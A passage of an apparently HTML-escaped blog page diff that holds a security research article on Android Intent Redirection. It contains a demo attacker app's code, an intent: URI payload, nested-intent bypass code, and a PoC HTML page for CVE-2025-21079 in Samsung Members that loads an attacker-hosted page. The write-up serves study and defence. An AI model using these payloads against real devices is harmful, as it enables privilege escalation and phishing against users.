+                    Toast.makeText(MainActivity.&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Send failed: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+                }
+            }
+        });
+
+        Button direct = findViewById(R.id.btn_direct);
+        direct.setOnClickListener(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; View.OnClickListener() {
+            &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+            &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onClick&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(View v)&lt;/span&gt; &lt;/span&gt;{
+                &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+                    Intent i = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Intent();
+                    i.setClassName(VICTIM_PKG, SECRET_ACTIVITY);
+                    startActivity(i);
+                    Toast.makeText(MainActivity.&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Launched directly (unexpected)&amp;quot;&lt;/span&gt;, Toast.LENGTH_LONG).show();
+                } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (SecurityException e) {
+                    Toast.makeText(MainActivity.&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Direct launch denied: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+                } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (Exception e) {
+                    Toast.makeText(MainActivity.&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Direct launch failed: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+                }
+            }
+        });
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This source code is the part that sends the input value. To trigger Intent Redirection, it was written to target the hidden &lt;code&gt;SECRET_ACTIVITY&lt;/code&gt; in &lt;code&gt;victim.apk&lt;/code&gt;. In addition, a button was also made to check what happens when an intent is sent with &lt;code&gt;attacker.apk&lt;/code&gt;&amp;#x2018;s permissions.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Screen_recording_20261123_173334.gif&#34; alt=&#34;Screen recording&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This is the result of the hands-on using &lt;code&gt;attacker.apk&lt;/code&gt; and &lt;code&gt;victim.apk&lt;/code&gt;. In &lt;code&gt;victim.apk&lt;/code&gt;, a hardcoded string is printed by default. And because it is &lt;code&gt;exported=&amp;quot;false&amp;quot;&lt;/code&gt;, you can see that &lt;code&gt;attacker.apk&lt;/code&gt; cannot access that activity directly.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs fortran&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;intent&lt;/span&gt;:#&lt;span class=&#34;hljs-keyword&#34;&gt;Intent&lt;/span&gt;;component=com&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;example&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;victim/&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;SecretActivity;S&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;append=INJECTED;&lt;span class=&#34;hljs-keyword&#34;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, if you send an Intent message containing the message above, Intent Redirection occurs and this can be bypassed. The entity that calls &lt;code&gt;startActivity(forward)&lt;/code&gt;, the vulnerability identified earlier, is the victim process (victim UID). So the permission check of system_server, which performs basic UID validation, sees caller UID == target UID and allows the launch of the non-exported activity &lt;code&gt;SecretActivity&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Through this, the malicious string entered by the attacker was inserted, and we can confirm that a phishing scenario that lures the user into accessing a malicious URL is possible.&lt;/p&gt;
+&lt;h2 id=&#34;3-Nested-Intent&#34;&gt;&lt;a href=&#34;#3-Nested-Intent&#34; class=&#34;headerlink&#34; title=&#34;3. Nested Intent&#34;&gt;&lt;/a&gt;3. Nested Intent&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As the name implies, a Nested Intent means an Intent object in which multiple Intents exist in a nested state. It is a method of putting a completed Intent object into another Intent&amp;#x2019;s extra as a Parcelable and sending it, and making the victim app take it out and execute it as is.&lt;/p&gt;
+&lt;p&gt;Apps often put an Intent inside an Intent to pass along the next screen to open after a screen transition. Returning to the original screen after login, resuming work after a permission request, and routing proxy Activities are representative examples. Since &lt;code&gt;Intent&lt;/code&gt; is &lt;code&gt;Parcelable&lt;/code&gt;, it can be placed directly via &lt;code&gt;putExtra(&amp;quot;next&amp;quot;, innerIntent)&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This too, as a hands-on, let&amp;#x2019;s check what happens if we change the earlier hands-on into a nested intent.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;Intent forward = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (Guard.isAllowed(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, forward)) {     &lt;span class=&#34;hljs-comment&#34;&gt;// patch&lt;/span&gt;
+    Log.i(TAG, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[parseUri] allowed -&amp;gt; &amp;quot;&lt;/span&gt; + Guard.describe(forward));
+    launch(forward, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;parseUri&amp;quot;&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As a patch for the earlier Intent Redirection, &lt;code&gt;victim.apk&lt;/code&gt; changes, as above, to take out and execute the Intent object from the extra instead of a string.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;Intent inner = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Intent();
+inner.setClassName(VICTIM_PKG, SECRET_ACTIVITY);
+inner.putExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;append&amp;quot;&lt;/span&gt;, INJECTED);
+
+Intent outer = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Intent(ACTION_REDIRECT);
+outer.setClassName(VICTIM_PKG, REDIRECT_ACTIVITY);
+outer.putExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;forward_intent&amp;quot;&lt;/span&gt;, inner);
+send(outer);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To bypass this, &lt;code&gt;attacker.apk&lt;/code&gt; writes the payload into the inner Intent in nested intent form. And it composes a normal intent in the outer Intent extra, nesting the intents.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Screen_recording_20261123_215017.gif&#34; alt=&#34;Screen recording&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When you run the hands-on, you can confirm that Intent Redirection is blocked by the patch. However, when you send a payload made as a nested intent, you can confirm that the exploit works well. Like this, a nested intent can bypass two main things.&lt;/p&gt;
+&lt;p&gt;The first is the app&amp;#x2019;s input validation. Looking only at the outer Intent it appears normal, but the attack payload is wrapped as a Parcel inside the extra, so it passes the scheme/host/action whitelist check on the basis of the outer Intent. Until the victim app takes it out with &lt;code&gt;getParcelableExtra()&lt;/code&gt;, the inner Intent is just an opaque lump of parcel bytes.&lt;/p&gt;
+&lt;p&gt;The second is the &lt;code&gt;android:exported=&amp;quot;false&amp;quot;&lt;/code&gt; access restriction. If you set the inner Intent&amp;#x2019;s component to the victim app&amp;#x2019;s private Activity, the victim app calls &lt;code&gt;startActivity()&lt;/code&gt; with its own UID, so the permission check passes.&lt;/p&gt;
+&lt;p&gt;Android 16 blocks this pattern at the OS level. When both the app&amp;#x2019;s targetSdk and the OS are Android 16, an Intent taken out of an extra is blocked from execution by default. However, if the developer calls &lt;code&gt;removeLaunchSecurityProtection()&lt;/code&gt; on the taken-out Intent, this protection is lifted.&lt;/p&gt;
+&lt;h2 id=&#34;4-1-Day-Case-CVE-2025-21079&#34;&gt;&lt;a href=&#34;#4-1-Day-Case-CVE-2025-21079&#34; class=&#34;headerlink&#34; title=&#34;4. 1-Day Case: CVE-2025-21079&#34;&gt;&lt;/a&gt;4. 1-Day Case: CVE-2025-21079&lt;/h2&gt;&lt;p&gt;Let&amp;#x2019;s look at &lt;a href=&#34;https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/&#34;&gt;CVE-2025-21079&lt;/a&gt;, a real-world case of Intent Redirection. This vulnerability was demonstrated at Pwn2Own Ireland 2025. It is a vulnerability that chains from the Samsung Members app and ultimately allows launching an Activity with System privileges. It is a chain that displays an attacker-controlled URL in the WebView inside the Samsung Members app and, through that WebView, connects all the way to Intent Redirection.&lt;/p&gt;
+&lt;h3 id=&#34;4-1-Webview&#34;&gt;&lt;a href=&#34;#4-1-Webview&#34; class=&#34;headerlink&#34; title=&#34;4.1. Webview&#34;&gt;&lt;/a&gt;4.1. Webview&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;String url = getIntent().getStringExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;url&amp;quot;&lt;/span&gt;);
+String viewType = getIntent().getStringExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;viewType&amp;quot;&lt;/span&gt;);
+&lt;span class=&#34;hljs-keyword&#34;&gt;boolean&lt;/span&gt; allowWithoutLogin =
+        getIntent().getBooleanExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ALLOW_WITHOUT_LOGIN&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;false&lt;/span&gt;);
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (ActionUri.canPerformActionLink(getIntent())
+        &amp;amp;&amp;amp; (allowWithoutLogin || isLoggedIn())) { &lt;span class=&#34;hljs-comment&#34;&gt;// vuln&lt;/span&gt;
+    route(ActionUri.NEWS_AND_TIPS_DETAIL, getIntent().getExtras());
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;If &lt;code&gt;allowWithoutLogin&lt;/code&gt; is &lt;code&gt;true&lt;/code&gt;, it routes immediately without checking &lt;code&gt;isLoggedIn()&lt;/code&gt;, so if the attacker simply puts &lt;code&gt;ALLOW_WITHOUT_LOGIN=true&lt;/code&gt; in the extra, they can enter the internal screen without logging in.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;INAPP&amp;quot;&lt;/span&gt;.equals(viewType) &amp;amp;&amp;amp; url != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; url.startsWith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http&amp;quot;&lt;/span&gt;)) {
+    webView.getSettings().setJavaScriptEnabled(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;);
+    webView.setWebViewClient(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; yi3());
+    webView.loadUrl(url); &lt;span class=&#34;hljs-comment&#34;&gt;// vuln&lt;/span&gt;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It only checks whether &lt;code&gt;viewType&lt;/code&gt; is &lt;code&gt;&amp;quot;INAPP&amp;quot;&lt;/code&gt; and &lt;code&gt;url&lt;/code&gt; starts with &lt;code&gt;http&lt;/code&gt;, then calls &lt;code&gt;loadUrl(url)&lt;/code&gt;. Since it does not validate the target host or domain at all, if the attacker puts their own server address in the extra &lt;code&gt;url&lt;/code&gt;, that page is loaded as-is into Samsung Members&amp;#x2019; WebView.&lt;/p&gt;
+&lt;h3 id=&#34;4-2-Intent-Redirection&#34;&gt;&lt;a href=&#34;#4-2-Intent-Redirection&#34; class=&#34;headerlink&#34; title=&#34;4.2. Intent Redirection&#34;&gt;&lt;/a&gt;4.2. Intent Redirection&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;shouldOverrideUrlLoading&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(WebView view, WebResourceRequest req)&lt;/span&gt; &lt;/span&gt;{
+    String url = req.getUrl().toString();
+    oh6.L(activity, url);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;yi3.shouldOverrideUrlLoading&lt;/code&gt; intercepts every URL the WebView tries to navigate to, turns it into a string, and passes it to &lt;code&gt;oh6.L&lt;/code&gt;. If the attacker&amp;#x2019;s server returns an &lt;code&gt;intent:&lt;/code&gt; URL as a 302 response to the page loaded in step 1, that URL reaches &lt;code&gt;oh6.L&lt;/code&gt; as-is.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Activity activity, String str)&lt;/span&gt; &lt;/span&gt;{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (TextUtils.isEmpty(str)) &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!str.startsWith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;intent:&amp;quot;&lt;/span&gt;)) &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+        Intent uri = Intent.parseUri(str, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+        activity.getPackageManager().getPackageInfo(uri.getPackage(), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        activity.startActivity(uri); &lt;span class=&#34;hljs-comment&#34;&gt;// vuln&lt;/span&gt;
+    } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (Exception e) {
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The component, action, and extra of the delivered Intent are all values the attacker wrote into the &lt;code&gt;intent:&lt;/code&gt; URL, and &lt;code&gt;oh6.L&lt;/code&gt; does not check at all whether the source or target is safe. Since the entity calling &lt;code&gt;startActivity&lt;/code&gt; is Samsung Members, this Intent is fired with Samsung Members&amp;#x2019; permissions and launches any installed exported component with one click.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs html&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;button&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;style&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;height:200px;width:200px&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;onclick&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;yaystartyay()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;yaypocyay&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;button&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;        &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;yaystartyay&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; yayhostyay = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;172.16.30.113&amp;quot;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;            &lt;span class=&#34;hljs-comment&#34;&gt;// open com.samsung.android.voc&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;            location.href=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;intent://view/newsAndTipsDetail#Intent;S.viewType=INAPP;scheme=voc;B.ALLOW_WITHOUT_LOGIN=true;S.url=http%3A%2F%2F&amp;quot;&lt;/span&gt; + yayhostyay + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%3A8000%2Fyayredirect1yay;end&amp;quot;&lt;/span&gt;;&lt;/span&gt;
+        }
+
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The code above is the HTML code on the malicious web page that contains the Intent Redirection payload. In other words, it bypasses the &lt;code&gt;intent: URL&lt;/code&gt; check in the WebView, and the app interprets it with &lt;code&gt;parseUri&lt;/code&gt; and executes it as-is. Through this, any exported Activity of an installed package can be launched with a single click.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%206.png&#34; alt=&#34;[Pwn2Own 2025 &amp;#x2013; Part 1: Samsung Members WebView Takeover &amp;amp; Intent Redirection (CVE-2025-21079) | Djini AI](https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/&#34;&gt;Pwn2Own 2025 &amp;#x2013; Part 1: Samsung Members WebView Takeover &amp;amp; Intent Redirection (CVE-2025-21079) | Djini AI&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Looking at the GIF of the PoC process, triggering the PoC link from the malicious URL with one click goes through the Samsung Members app and ultimately launches the Settings app. Since the Settings app is a System-privileged app holding UID 1000, this PoC confirms that a 1-Click System Activity Launch is possible. The article explains that the Pwn2Own chain was then completed with a chain continuing into Samsung Account and Bixby.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As revealed in Android&amp;#x2019;s development philosophy examined earlier, Android has the characteristic of isolation between apps. Because of this, the representative means of affecting another app is exactly the Intent, and in terms of impact such as Lateral Movement as well as from a vulnerability and exploitation perspective, Intent Redirection is very important in Android.&lt;/p&gt;
+&lt;p&gt;And through this vulnerability, via an app without permissions or via input, one can obtain or access high privileges such as system (UID 1000). That is why it frequently appears and is used at Pwn2Own as well.&lt;/p&gt;
+&lt;p&gt;In my personal opinion, now that countless vulnerabilities are being found and patched with LLMs, I think this is a vulnerability that is relatively hard for AI to find. Compared to Memory Corruption, where the vulnerability is immediately revealed in the code through static analysis, I think the strength of Intent Redirection&amp;#x2014;which arises in communication between other apps that looks as if it were normal&amp;#x2014;is becoming apparent.&lt;/p&gt;
+&lt;p&gt;So! I&amp;#x2019;ll work hard to find vulnerabilities and try to write the next article with a vulnerability I found myself!&lt;/p&gt;
+&lt;p&gt;Next time, I&amp;#x2019;ll be back as Part 3 with another teammate. Thank you!&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[Two paths, Same Dream] A Weapon for Those Without Rooting: Intent Redirection Part 1. (EN) - hackyboiz">
+  <meta property="og:description" content="&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Hello! I&amp;#x2019;m &lt;code&gt;newp1ayer48&lt;/code&gt;, the one handling the lowest place (low-level) at Hackyboiz, now looking toward higher places! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
+&lt;p&gt;With the Two paths, Same Dream project I&amp;#x2019;ve been looking at Android, and within that I focus mainly on the application layer on Samsung Galaxy. There&amp;#x2019;s a sad story behind this: on Samsung Galaxy, rooting is blocked by default starting from the One UI 8.5 (Android 16) version. Because rooting would therefore require yet another 0-day&amp;#x2026; I shout &amp;#x201C;actually, even better&amp;#x201D; and focus mainly on logical bugs.&lt;/p&gt;
+&lt;p&gt;The main topic of this article is intent redirection, a vulnerability characteristic of Android and at the same time a frequently used logical bug vulnerability. Through it, without memory corruption or command injection, you can even reach a shell with high privileges such as system!&lt;/p&gt;
+&lt;h2 id=&#34;1-Intent&#34;&gt;&lt;a href=&#34;#1-Intent&#34; class=&#34;headerlink&#34; title=&#34;1. Intent&#34;&gt;&lt;/a&gt;1. Intent&lt;/h2&gt;&lt;p&gt;Intent was already introduced in the previous &lt;a href=&#34;https://hackyboiz.github.io/2026/10/12/Libera/Two_paths,Same_Dream_Part0/En/&#34;&gt;Part 0 research article&lt;/a&gt;, but since it is an important concept, let&amp;#x2019;s go over it again. In particular, let&amp;#x2019;s look at why the Intent form was used when Android was first developed and designed.&lt;/p&gt;
+&lt;p&gt;Android is an operating system designed on the philosophy that &amp;#x201C;anyone can upload an app and anyone can install it.&amp;#x201D; Therefore, developing programs in an unmanaged language that can directly access memory, like traditional C/C++, would have been a major performance/security risk. In addition, the Android application model had to be designed in a form that satisfies the following four constraints and conditions.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Speed: the system must be able to spin up a process for any part of an app when needed, and be launchable from multiple entry points.&lt;/li&gt;
+&lt;li&gt;Lifecycle: a process can die at any time, and there may be no receiver.&lt;/li&gt;
+&lt;li&gt;Name resolution: there are cases where the system cannot point to something by name, as with third-party apps, or does not know it.&lt;/li&gt;
+&lt;li&gt;Security: each app must be isolated by UID.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Therefore, a simple remote method call alone cannot satisfy these.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%201.png&#34; alt=&#34;[https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2](https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2&#34;&gt;https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;To solve this problem, Binder IPC was adopted. This is a mechanism that already exists in the Linux Kernel. The Binder residing in the kernel delivers communication between different processes in the form of IPC messages. Through this, isolation between processes (apps) can be achieved.&lt;/p&gt;
+&lt;p&gt;A similar structure in the form of XPC can also be seen in iOS and macOS.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%202.png&#34; alt=&#34;[https://developer.android.com/guide/platform?hl=ko](https://developer.android.com/guide/platform?hl=ko)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://developer.android.com/guide/platform?hl=ko&#34;&gt;https://developer.android.com/guide/platform?hl=ko&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Therefore, the messages used for inter-app communication in Android must take the form of described data so that the system can read, interpret, store, and delegate them. For this reason, in addition to Binder IPC, the Java-level Intent is introduced to achieve the constraints and conditions mentioned earlier.&lt;/p&gt;
+&lt;p&gt;The Android architecture can be seen as in the picture above, and can be broadly divided into the Java Level, which runs on the Java framework, and the C Level, which runs on the Native Library/Linux Kernel. In this architecture diagram, Intent can be seen as belonging to the Java Level, and Binder IPC to the C Level.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Mapping this to the earlier Android architecture diagram, the process of sending an Intent message from App A to App B is illustrated as above. The intent object created at App A&amp;#x2019;s Java framework layer generates a parcel message in the native library. The binder delivers it in IPC form, and in between, the system_server with System privileges (UID 1000) performs a permission check. If it passes, delivery to App B is completed, and the structure is such that the Intent is read from the parcel message and handled in App B.&lt;/p&gt;
+&lt;h2 id=&#34;2-Intent-Redirection&#34;&gt;&lt;a href=&#34;#2-Intent-Redirection&#34; class=&#34;headerlink&#34; title=&#34;2. Intent Redirection&#34;&gt;&lt;/a&gt;2. Intent Redirection&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;A good example for observing Intent with our own eyes is the notification. The entity that displays and triggers a notification is SystemUI (the system UI process), but when you tap a notification and it is sent, the actual Intent runs with the identity and permissions of the original app that created the notification. For example, when you tap the action button of a calendar notification or the body of a message notification, that Intent is fired not with SystemUI&amp;#x2019;s permissions but with the calendar/message app&amp;#x2019;s permissions. The basic idea of Intent Redirection starts right here.&lt;/p&gt;
+&lt;p&gt;In the normal case, App A can only launch App B&amp;#x2019;s exported components. A component with &lt;code&gt;android:exported=&amp;quot;false&amp;quot;&lt;/code&gt; can only be launched by the same app (the same UID). Intent Redirection bypasses this access control through a proxied execution that runs with that app&amp;#x2019;s permissions. For this reason, Intent Redirection is classified as a logical bug vulnerability that falls under the Confused Deputy problem.&lt;/p&gt;
+&lt;p&gt;The attacker does not call the private component directly. Instead, they send data to the victim app&amp;#x2019;s exported component, and make the victim app send, on their behalf, the Intent built from that data via &lt;code&gt;startActivity()&lt;/code&gt; and the like. As far as the system is concerned, the caller is not the attacker but the victim app.&lt;/p&gt;
+&lt;div class=&#34;table-container&#34;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&amp;#xC9C0;&amp;#xC810;&lt;/th&gt;
+&lt;th&gt;&amp;#xBC1C;&amp;#xC0AC; API&lt;/th&gt;
+&lt;th&gt;&amp;#xACF5;&amp;#xACA9;&amp;#xC790;&amp;#xAC00; &amp;#xB178;&amp;#xB9AC;&amp;#xB294; &amp;#xAC83;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Activity&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;startActivity()&lt;/code&gt;, &lt;code&gt;startActivityForResult()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Launch a private Activity, steal result data&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Broadcast Receiver&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;sendBroadcast()&lt;/code&gt;, &lt;code&gt;sendOrderedBroadcast()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Deliver a crafted broadcast to a private Receiver, forge a protected action&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Content Provider&lt;/td&gt;
+&lt;td&gt;Intent data URI(&lt;code&gt;content://&lt;/code&gt;) + &lt;code&gt;FLAG_GRANT_READ/WRITE_URI_PERMISSION&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Delegate access to a private provider to the attacker&amp;#x2019;s component &amp;#x2192; steal files/DB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PendingIntent&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;PendingIntent.send()&lt;/code&gt; (including notifications)&lt;/td&gt;
+&lt;td&gt;Fire a stored Intent on behalf, with the original app&amp;#x2019;s permissions&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
